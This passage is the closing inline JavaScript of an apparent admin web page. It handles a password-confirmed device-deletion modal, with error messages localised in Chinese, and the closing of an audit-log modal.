        function openDeleteDeviceModal(deviceId) {
          deleteDeviceModalDeviceId = deviceId;
          document.getElementById('deleteDevicePasswordInput').value = '';
          document.getElementById('deleteDeviceModalError').style.display = 'none';
          document.getElementById('deleteDeviceModalError').textContent = '';
          document.getElementById('deleteDeviceModalOverlay').style.display = 'flex';
          document.getElementById('deleteDevicePasswordInput').focus();
        }
        function closeDeleteDeviceModal() {
          deleteDeviceModalDeviceId = null;
          document.getElementById('deleteDeviceModalOverlay').style.display = 'none';
        }
        document.querySelectorAll('.btn-device-delete').forEach(function(btn){
          btn.onclick = function(){
            var deviceId = getDeviceIdFromButton(this);
            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
            openDeleteDeviceModal(deviceId);
          };
        });
        document.getElementById('deleteDeviceModalClose').onclick = closeDeleteDeviceModal;
        document.getElementById('deleteDeviceModalCancel').onclick = closeDeleteDeviceModal;
        document.getElementById('deleteDeviceModalOverlay').onclick = function(e){ if (e.target === this) closeDeleteDeviceModal(); };
        document.getElementById('deleteDeviceModalConfirm').onclick = function(){
          var deviceId = deleteDeviceModalDeviceId;
          var password = (document.getElementById('deleteDevicePasswordInput').value || '').trim();
          var errEl = document.getElementById('deleteDeviceModalError');
          if (!password) {
            errEl.textContent = i18n.t('deleteDevicePasswordRequired') || '请输入登录密码';
            errEl.style.display = 'block';
            return;
          }
          this.disabled = true;
          errEl.style.display = 'none';
          adminApi.deleteDevice(deviceId, password).then(function(r){
            if (r.status === 204 || r.ok) {
              closeDeleteDeviceModal();
              loadDevices();
              alert(i18n.t('deleteDeviceSuccess') || '设备已删除');
              return;
            }
            return (r.json ? r.json() : Promise.resolve({})).then(function(b){ return b; });
          }).then(function(body){
            document.getElementById('deleteDeviceModalConfirm').disabled = false;
            if (body === undefined) return;
            var msg = (body && body.code === 'invalid_credentials') ? (i18n.t('deleteDevicePasswordWrong') || '登录密码错误') : ((body && body.message) || (body && body.code) || i18n.t('networkError'));
            errEl.textContent = msg || '';
            errEl.style.display = 'block';
          }).catch(function(){
            document.getElementById('deleteDeviceModalConfirm').disabled = false;
            errEl.textContent = i18n.t('networkError') || '网络错误，请重试';
            errEl.style.display = 'block';
          });
        };
      }
      document.getElementById('auditModalClose').onclick = function(){ document.getElementById('auditModalOverlay').style.display = 'none'; };
      document.getElementById('auditModalOverlay').onclick = function(e){ if (e.target === this) this.style.display = 'none'; };
    }
  </script>
</body>
</html>
